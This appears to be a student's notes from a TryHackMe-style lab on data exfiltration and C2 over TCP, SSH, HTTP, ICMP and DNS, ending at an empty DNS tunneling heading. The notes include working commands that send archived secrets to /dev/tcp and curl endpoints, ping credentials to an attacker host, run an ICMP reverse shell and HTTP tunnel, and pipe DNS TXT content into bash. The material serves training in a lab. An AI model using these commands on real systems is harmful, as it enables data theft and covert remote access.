


#### INTRO
Data exfiltration is a non-traditional approach for copying and transferring data from a compromised to an attacker's machine. The data exfiltration technique is used to emulate the normal network activities, and It relies on network protocols such as DNS, HTTP, SSH, etc. Data Exfiltration over common protocols is challenging to detect and distinguish between legitimate and malicious traffic.

Sensitive data can be in various types and forms, and it may contain the following:

- Usernames and passwords or any authentication information.
- Bank accounts details
- Business strategic decisions.
- Cryptographic keys.
- Employee and personnel information.
- Project code data.


- What is Data exfiltration?
- Understand data exfiltration types and how they can be used.  
    
- Practice data exfiltration over protocols: Sockets, SSH, ICMP, HTTP(s), and DNS.
- Practice C2 communications over various protocols.
- Practice establishing Tunneling over DNS and HTT



##### How to use Data Exfiltration
There are three primary use case scenarios of data exfiltration, including:

1. Exfiltrate data

	The traditional Data Exfiltration scenario is moving sensitive data out of the organization's network. An attacker can make one or more network requests to transfer the data, depending on the data size and the protocol used. Note that a threat actor does not care about the reply or response to his request. Thus, all traffic will be in one direction, from inside the network to outside. Once the data is stored on the attacker's server, he logs into it and grabs the data.
![[Pasted image 20251113090938.png]]

2. Command and control communications.
 
	Many C2 frameworks provide options to establish a communication channel, including standard and non-traditional protocols to send commands and receive responses from a victim machine. In C2 communications a limited number of requests where an attacker sends a request to execute a command in the victim's machine. Then, the agent's client executes the command and sends a reply with the result over a non-traditional protocol. The communications will go in two directions: into and out of the network.
![[Pasted image 20251113090949.png]]

3. Tunneling
	 In the Tunneling scenario, an attacker uses this data exfiltration technique to establish a communication channel between a victim and an attacker's machine. The communication channel acts as a bridge to let the attacker machine access the entire internal network. There will be continuous traffic sent and received while establishing the connection.
![[Pasted image 20251113091022.png]]




#### Exfiltration using TCP socket
If we are in a well-secured environment, then this kind of exfiltration is not recommended. This exfiltration type is easy to detect because we rely on non-standard protocols.

![[Pasted image 20251113091424.png]]

1. The first machine is listening over TCP on port **1337**
2. The other machine connects to the port specified in step 1. For example, **nc 1.2.3.4 1337**
3. The first machine establishes the connection
4. Finally, the sending and receiving data starts. For example, the attacker sends commands and receives results.

on the jumpbox maching:

`nc -lvp 8080 > /tmp/task4-creds.data`

we used the nc command to receive data on port 8080. Then, once we receive the data, we store it in the /tmp/ directory and call it task4-creds.data as a filename.

on the victime maching we want to exfiltrate:
![[Pasted image 20251113093202.png]]

lets exfiltrate it:

`thm@victim1:$ tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/8080`

![[Pasted image 20251113093225.png]]
1. We used the tar command to create an archive file with the zcf arguments of the content of the secret directory.
2. The z is for using gzip to compress the selected folder, the c is for creating a new archive, and the f is for using an archive file.
3. We then passed the created tar file to the base64 command for converting it to base64 representation.
4. Then, we passed the result of the base64 command to create and copy a backup file with the dd command using EBCDIC encoding data.
5. Finally, we redirect the dd command's output to transfer it using the TCP socket on the specified IP and port, which in this case, port 8080.

on the jumpbox:

`thm@jump-box$ cd /tmp/` 

`thm@jump-box:/tmp/$ dd conv=ascii if=task4-creds.data |base64 -d > task4-creds.tar`

`thm@jump-box$ tar xvf task4-creds.tar`

`thm@jump-box$ cat task4/creds.txt` 
`admin:password` 
`Admin:123456` 
`root:toor`



#### Exfiltration using SSH

data we want to exfiltrate:
![[Pasted image 20251113094359.png]]

```markup
thm@victim1:$ tar cf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"
```

Let's break down the previous command and explain it:  

1. We used the tar command the same as the previous task to create an archive file of the task5 directory.
2. Then we passed the archived file over the ssh. SSH clients provide a way to execute a single command without having a full session.
3. We passed the command that must be executed in double quotations, "cd /tmp/; tar xpf. In this case, we change the directory and unarchive the passed file.

on the jump box maching:

![[Pasted image 20251113094559.png]]
#### Exfiltrate using HTTP(S)
This task explains how to use the HTTP/HTTPS protocol to exfiltrate data from a victim to an attacker's machine. As a requirement for this technique, an attacker needs control over a webserver with a server-side programming language installed and enabled. We will show a PHP-based scenario in this task, but it can be implemented in any other programming language, such as python, Golang, NodeJS, etc.

##### HTTP POST Request

Exfiltration data through the HTTP protocol is one of the best options because it is challenging to detect. It is tough to distinguish between legitimate and malicious HTTP traffic. We will use the POST HTTP method in the data exfiltration, and the reason is with the GET request, all parameters are registered into the log file. While using POST request, it doesn't. The following are some of the POST method benefits:

- POST requests are never cached
- POST requests do not remain in the browser history
- POST requests cannot be bookmarked
- POST requests have no restrictions on **data length

on the web maching we can do some מיצוי ישות and see the apache log:

`thm@web-thm:~$ sudo cat /var/log/apache2/access.log`


In a typical real-world scenario, an attacker controls a web server in the cloud somewhere on the Internet. An agent or command is executed from a compromised machine to send the data outside the compromised machine's network over the Internet into the webserver. Then an attacker can log in to a web server to get the data, as shown in the following figure.
![[Pasted image 20251113095530.png]]

##### HTTP Data Exfiltration
let's assume that an attacker controls the web.thm.com server, and sensitive data must be sent from the JumpBox or  victim1.thm.com

To exfiltrate data over the HTTP protocol, we can apply the following steps:
1. n attacker sets up a web server with a data handler. In our case, it will be web.thm.com and the contact.php page as a data handler.
2. A C2 agent or an attacker sends the data. In our case, we will send data using the curl command.
3. The webserver receives the data and stores it. In our case, the contact.php receives the POST request and stores it into /tmp.
4. The attacker logs into the webserver to have a copy of the received data.

First, we prepared a webserver with a data handler for this task. The following code snapshot is of PHP code to handle POST requests via a file parameter and stores the received data in the /tmp directory as http.bs64 file name.

on the compromised web server:

```php
<?php 
if (isset($_POST['file'])) {
        $file = fopen("/tmp/http.bs64","w");
        fwrite($file, $_POST['file']);
        fclose($file);
   }
?>
```



on the victime maching:

we will be using the curl command to send an HTTP POST request with the content of the secret folder as follows,

`thm@victim1:~$ curl --data "file=$(tar zcf - task6 | base64)" http://web.thm.com/contact.php`

on the web maching:


 `thm@web:~$ cat /tmp/http.bs64
 
 `H4sIAAAAAAAAA 3ROw7CMBBFUddZhVcA/sYSHUuJSAoKMLKNYPkkgSriU1kIcU/hGcsuZvTysEtD< WYua1Ch4P9fRss69dsZ4E6wNTiitlTdC qpTPZxz6ZKUIsVY3v379P6j8j3/8ejzqlyrrDgF3Dr3 On/XLvI3QVshVY1hlv48/64/7I bU5fzJaa 2c5XbazzbTOtvCkxpubbUwIAAAAAAAAAAAAAAAB4 5gZKZxgrACgAAA==`
 
Nice! We have received the data, but if you look closely at the http.bs64 file, you can see it is broken base64. This happens due to the URL encoding over the HTTP. The + symbol has been replaced with empty spaces, so let's fix it using the sed command as follows,

`thm@web:~$ sudo sed -i 's/ /+/g' /tmp/http.bs64`

Using the sed command, we replaced the spaces with + characters to make it a valid base64 string!

`thm@web:~$ cat /tmp/http.bs64 | base64 -d | tar xvfz - tmp/task6/ tmp/task6/creds.txt`

Finally, we decoded the base64 string using the base64 command with -d argument, then we passed the decoded file and unarchived it using the tar command.


##### HTTPS Communications
In the previous section, we showed how to perform Data Exfiltration over the HTTP protocol which means all transmitted data is in cleartext. One of the benefits of HTTPS is encrypting the transmitted data using SSL keys stored on a server.

If you apply the same technique we showed previously on a web server with SSL enabled, then we can see that all transmitted data will be encrypted. We have set up our private HTTPS server to show what the transmitted data looks like. If you are interested in setting up your own HTTPS server, we suggest visiting the [Digital Ocean website](https://www.digitalocean.com/community/tutorials/how-to-create-a-self-signed-ssl-certificate-for-apache-in-ubuntu-18-04).


##### HTTP Tunneling 

Tunneling over the HTTP protocol technique encapsulates other protocols and sends them back and forth via the HTTP protocol. HTTP tunneling sends and receives many HTTP requests depending on the communication channel!

Before diving into HTTP tunneling details, let's discuss a typical scenario where many internal computers are not reachable from the Internet. For example, in our scenario, the uploader.thm.com server is reachable from the Internet and provides web services to everyone. However, the app.thm.com server runs locally and provides services only for the internal network as shown in the following figure:

![[Pasted image 20251113101403.png]]

In this section, we will create an HTTP tunnel communication channel to pivot into the internal network and communicate with local network devices through HTTP protocol. Let's say that we found a web application that lets us upload an HTTP tunnel agent file to a victim webserver, uploader.thm.com. Once we upload and connect to it, we will be able to communicate with app.thm.com.

For HTTP Tunneling, we will be using a [Neo-reGeorg](https://github.com/L-codes/Neo-reGeorg) tool to establish a communication channel to access the internal network devices. 

Next, we need to generate an encrypted client file to upload it to the victim web server as follows,

`root@AttackBox:/opt/Neo-reGeorg# python3 neoreg.py generate -k thm`

The previous command generates encrypted Tunneling clients with thm key in the neoreg_servers/ directory. Note that there are various extensions available, including PHP, ASPX, JSP, etc. In our scenario, we will be uploading the tunnel.php file via the uploader machine. To access the uploader machine, you can visit the following URL: http://10.10.236.78/uploader or https://10-10-236-78.reverse-proxy-eu-west-1.tryhackme.com/uploader without the need for a VPN.


![[Pasted image 20251113103004.png]]
after uploading the tunnel.php file created using Neo-George lets connect to it:


```markup
root@AttackBox:/opt/Neo-reGeorg# python3 neoreg.py -k thm -u http://10.10.236.78/uploader/files/tunnel.php
```

We need to use the neoreg.py to connect to the client and provide the key to decrypt the tunneling client. We also need to provide a URL to the PHP file that we uploaded on the uploader machine.

Once it is connected to the tunneling client, we are ready to use the tunnel connection as a proxy binds on our local machine, 127.0.0.1, on port 1080.

For example, if we want to access the app.thm.com, which has an internal IP address 172.20.0.121 on port 80, we can use the curl command with --socks5 argument. We can also use other proxy applications, such as ProxyChains, FoxyProxy, etc., to communicate with the internal network.

`root@AttackBox:~$ curl --socks5 127.0.0.1:1080 http://172.20.0.121:80`

![[Pasted image 20251113104421.png]]


#### Exfiltration using ICMP
Network devices such as routers use ICMP protocol to check network connectivities between devices. Note that the ICMP protocol is not a transport protocol to send data between devices. Let's say that two hosts need to test the connectivity in the network; then, we can use the ping command to send ICMP packets through the network, as shown in the following figure.

![[Pasted image 20251113105758.png]]

The HOST1 sends an ICMP packet with an **echo-request** packet. Then, if HOST2 is available, it sends an ICMP packet back with an **echo reply** message confirming the availability.

##### ICMP Data Section
On a high level, the ICMP packet's structure contains a Data section that can include strings or copies of other information, such as the IPv4 header, used for error messages. The following diagram shows the Data section, which is optional to use.

![[Pasted image 20251113105858.png]]
Note that the Data field is optional and could either be empty or it could contain a random string during the communications. As an attacker, we can use the ICMP structure to include our data within the Data section and send it via ICMP packet to another machine. The other machine must capture the network traffic with the ICMP packets to receive the data.

To perform manual ICMP data exfiltration, we need to discuss the ping command a bit more. The ping command is a network administrator software available in any operating system. It is used to check the reachability and availability by sending ICMP packets, which can be used as follows:

`thm@AttackBox$ ping 10.10.79.254 -c 1`

We choose to send one ICMP packet from Host 1, our AttackBox, to Host 2, the target machine, using the-c 1 argument from the previous command. Now let's examine the ICMP packet in Wireshark and see what the Data section looks like.

![[Pasted image 20251113110152.png]]

The Wireshark screenshot shows that the Data section has been selected with random strings. It is important to note that this section could be filled with the data that needs to be transferred to another machine. 

The ping command in the Linux OS has an interesting ICMP option. With the -p argument, we can specify 16 bytes of data in hex representation to send through the packet. Note that the -p option is only available for Linux operating systems. We can confirm that by checking the ping's help manual page.

Let's say that we need to exfiltrate the following credentials thm:tryhackme. First, we need to convert it to its Hex representation and then pass it to the ping command using -p options as follows

![[Pasted image 20251113110248.png]]We used the xxd command to convert our string to Hex, and then we can use the ping command with the Hex value we got from converting the thm:tryhackme.

![[Pasted image 20251113110300.png]]

We sent one ICMP packet using the ping command with thm:tryhackme Data. Let's look at the Data section for this packet in the Wireshark.

![[Pasted image 20251113110318.png]]

##### ICMP Data Exfiltration
Now that we have the basic fundamentals of manually sending data over ICMP packets, let's discuss how to use Metasploit to exfiltrate data. The Metasploit framework uses the same technique explained in the previous section. However, it will capture incoming ICMP packets and wait for a Beginning of File (BOF) trigger value. Once it is received, it writes to the disk until it gets an End of File (EOF) trigger value. The following diagram shows the required steps for the Metasploit framework. Since we need the Metasploit Framework for this technique, then we need the AttackBox machine to perform this attack successfully.

![[Pasted image 20251113110429.png]]

Now from the **AttackBox**, let's set up the Metasploit framework by selecting the icmp_exfil module to make it ready to capture and listen for ICMP traffic. One of the requirements for this module is to set the BPF_FILTER option, which is based on TCPDUMP rules, to capture only ICMP packets and ignore any ICMP packets that have the source IP of the attacking machine as follows,

on the jump box:

`msf5 > use auxiliary/server/icmp_exfil` 
`msf5 auxiliary(server/icmp_exfil) > set BPF_FILTER icmp and not src ATTACKBOX_IP` 


We also need to select which network interface to listen to, eth0. Finally, executes run to start the module.

`msf5 auxiliary(server/icmp_exfil) > set INTERFACE eth0` 

`msf5 auxiliary(server/icmp_exfil) > run` 


on the victim:

`thm@icmp-host:~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "BOFfile.txt"`

`thm@icmp-host:~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "admin:password"`

`thm@icmp-host:~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "EOF"`


Let's check our AttackBox once we have done sending the data and the ending trigger value.
![[Pasted image 20251113112817.png]]
##### ICMP C2 Communication
Next, we will show executing commands over the ICMP protocol using the [ICMPDoor](https://github.com/krabelize/icmpdoor) tool. ICMPDoor is an open-source reverse-shell written in Python3 and scapy. The tool uses the same concept we discussed earlier in this task, where an attacker utilizes the Data section within the ICMP packet. The only difference is that an attacker sends a command that needs to be executed on a victim's machine. Once the command is executed, a victim machine sends the execution output within the ICMP packet in the Data section.
![[Pasted image 20251113112927.png]]

on the victime:
```markup
thm@icmp-host:~$ sudo icmpdoor -i eth0 -d 192.168.0.133
```

on the jumpbox:
`thm@jump-box$ sudo icmp-cnc -i eth1 -d 192.168.0.121`
![[Pasted image 20251113113358.png]]


#### DNS Configuration
To perform exfiltration via the DNS protocol, you need to control a domain name and set up DNS records, including NS, A, or TXT. Thus, we provide a web interface to make it easy for you to add and modify the DNS records. The following domain name is set up and ready for the DNS exfiltration task: tunnel.com.

We will be using the Attacker machine to exfiltrate in DNS and DNS tunneling scenarios. The main goal is that the Attacker machine (on Network2) can access internal network devices of Network 1 through JumpBox.

![[Pasted image 20251113113852.png]]

##### Nameserver for DNS Exfiltration

To successfully execute DNS exfiltration within the provided network or on the Internet, we need to set up a name server for the domain name we control as the following:

1. Add an **A** record that points to the AttackBox's IP address. For example, Type: **A**, Subdomain Name: **t1ns**, Value: **AttackBox_IP**.
2. Add an **NS** record that routes DNS queries to the **A** records in **step 1**. For example, Type: NS, Subdomain Name: t1, Value: t1ns.tunnel.com.


##### Lab Recommendation

Even though you can use the AttackBox for this room, we recommend using the **JumpBox** for most parts (TCP, SSH, ICMP, DNS) to avoid technical issues with DNS and networking. If you prefer to use the AttackBox for the DNS Tunneling task (task 10), you must change the DNS settings of the AttackBox to 10.10.79.254. There are many ways to change the DNS settings in the AttackBox machine. However, the following is one of the stable solutions we found for our environment.

First, we need to edit the Yaml Netplan configuration file.

![[Pasted image 20251113114202.png]]
Modify the Netplan configuration file and add the **nameserver** section under the **eth0** interface to be as the following:

![[Pasted image 20251113114214.png]]
Finally, apply the Netplan Changes (This may need to be run twice).![[Pasted image 20251113114233.png]]

##### DNS Testing

Once you have access to the Jump machine, you need to make sure that the DNS is working correctly by testing it as follows:



![[Pasted image 20251113115136.png]]




#### Exfiltration over DNS

##### What is DNS Data Exfiltration?
Since DNS is not a transport protocol, many organizations don't regularly monitor the DNS protocol! The DNS protocol is allowed in almost all firewalls in any organization network. For those reasons, threat actors prefer using the DNS protocol to hide their communications.

The DNS protocol has limitations that need to be taken into consideration, which are as follows,

- The maximum length of the Fully Qualified FQDN domain name (including .separators) is 255 characters.
- The subdomain name (label) length must not exceed 63 characters (not including .com, .net, etc).
![[Pasted image 20251113115224.png]]

Based on these limitations, we can use a limited number of characters to transfer data over the domain name. If we have a large file, 10 MB for example, it may need more than 50000 DNS requests to transfer the file completely. Therefore, it will be noisy traffic and easy to notice and detect.

Now let's discuss the Data Exfiltration over DNS requirements and steps, which are as follows:
![[Pasted image 20251113115308.png]]
1. An attacker registers a domain name, for example, **tunnel.com** 
2. The attacker sets up tunnel.com's NS record points to a server that the attacker controls.
3. The malware or the attacker sends sensitive data from a victim machine to a domain name they control—for example, passw0rd.tunnel.com, where **passw0rd** is the data that needs to be transferred.
4. The DNS request is sent through the local DNS server and is forwarded through the Internet.
5. The attacker's authoritative DNS (malicious server) receives the DNS request.
6. Finally, the attacker extracts the password from the domain name.

##### When do we need to use the DNS Data Exfiltration?
There are many use case scenarios, but the typical one is when the firewall blocks and filters all traffic. We can pass data or TCP/UDP packets through a firewall using the DNS protocol, but it is important to ensure that the DNS is allowed and resolving domain names to IP addresses.

![[Pasted image 20251113115417.png]]


##### Modifying the DNS Records!

Now let's try to perform a DNS Data Exfiltration in the provided network environment. Note we will be using the **tunnel.com** domain name in this scenario. We also provide a web interface to modify the DNS records of tunnel.com to insert a Name Server (NS) that points to your AttackBox machine. Ensure to complete these settings in task 8.
##### DNS Data Exfiltration


Now let's explain the manual DNS Data Exfiltration technique and show how it works. Assume that we have a creds.txt file with sensitive data, such as credit card information. To move it over the DNS protocol, we need to encode the content of the file and attach it as a subdomain name as follows,

![[Pasted image 20251113142107.png]]

1. Get the required data that needs to be transferred.
2. Encode the file using one of the encoding techniques.
3. Send the encoded characters as subdomain/labels.
4. Consider the limitations of the DNS protocol. Note that we can add as much data as we can to the domain name, but we must keep the whole URL under 255 characters, and each subdomain label can't exceed 63 characters. If we do exceed these limits, we split the data and send more DNS requests!

the authoritive dns server for tunnel.com will be our server, lets connect to it

thm@jump-box$ ssh thm@attacker.thm.com

In order to receive any DNS request, we need to capture the network traffic for any incoming UDP/53 packets using the tcpdump tool.

###### on the dns authoritive server

thm@attacker$ sudo tcpdump -i eth0 udp port 53 -v

Once the attacker machine is ready, we can move to the next step which is to connect to our victim2 through SSH, which could be done from the Jump Box using the following credentials: thm:tryhackme.

###### on the victim

**as a couple of requests:**

thm@victim2:~$ cat task9/credit.txt | base64 | tr -d "\n"| fold -w18 | sed -r 's/.*/&.att.tunnel.com/'


In the previous command, we read the file's content and encoded it using Base64. Then, we cleaned the string by removing the new lines and gathered every 18 characters as a group. Finally, we appended the name server "att.tunnel.com" for every group.

**as a single request:**

single DNS request, which we will be using for our data exfiltration. This time, we split every 18 characters with a dot "." and add the name server similar to what we did in the previous command.

thm@victim2:~$ cat task9/credit.txt |base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/

**sending the dns querys:**

cat task9/credit.txt |base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/ | awk '{print "dig +short " $1}' | bash


###### on the dns authoritive server
![[Pasted image 20251113143738.png]]

`thm@attacker:~$ echo "TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com." | cut -d"." -f1-8 | tr -d "." | base64 -d`
![[Pasted image 20251113143942.png]]

##### C2 Communications over DNS

C2 frameworks use the DNS protocol for communication, such as sending a command execution request and receiving execution results over the DNS protocol. They also use the TXT DNS record to run a dropper to download extra files on a victim machine. This section simulates how to execute a bash script over the DNS protocol. We will be using the web interface to add a TXT DNS record to the tunnel.com domain name.

For example, let's say we have a script that needs to be executed in a victim machine. First, we need to encode the script as a Base64 representation and then create a TXT DNS record of the domain name you control with the content of the encoded script. The following is an example of the required script that needs to be added to the domain name:
```bash
#!/bin/bash 
ping -c 1 test.thm.com
```

The script executes the ping command in a victim machine and sends one ICMP packet to test.tunnel.com. Note that the script is an example, which could be replaced with any content. Now save the script to/tmp/script.sh using your favorite text editor and then encode it with Base64 as follows,

```bash
thm@victim2$ cat /tmp/script.sh | base64
```
Now that we have the Base64 representation of our script, we add it as a TXT DNS record to the domain we control, which in this case, the tunnel.com. You can add it through the web interface we provide http://MACHINE_IP/ or https://LAB_WEB_URL.p.thmlabs.com/ without using a VPN.

Once we added it, let's confirm that we successfully created the script's DNS record by asking the 
local DNS server to resolve the TXT record of the script.tunnel.com. If everything is set up correctly, we should receive the content we added in the previous step.

![[Pasted image 20251113151455.png]]


```bash
thm@victim2$ dig +short -t TXT script.tunnel.com
```
We used the dig command to check the TXT record of our DNS record that we added in the previous step! As a result, we can get the content of our script in the TXT reply. Now we confirmed the TXT record, let's execute it as follows,

```bash
thm@victim2$ dig +short -t TXT script.tunnel.com | tr -d "\"" | base64 -d | bash
```
Note that we cleaned the output before executing the script using tr and deleting any double quotes ". Then, we decoded the Base64 text representation using base64 -d and finally passed the content to the bash command to execute. 

Now replicate the C2 Communication steps to execute the content of the flag.tunnel.com TXT record and answer the question below.

#### DNS Tunneling
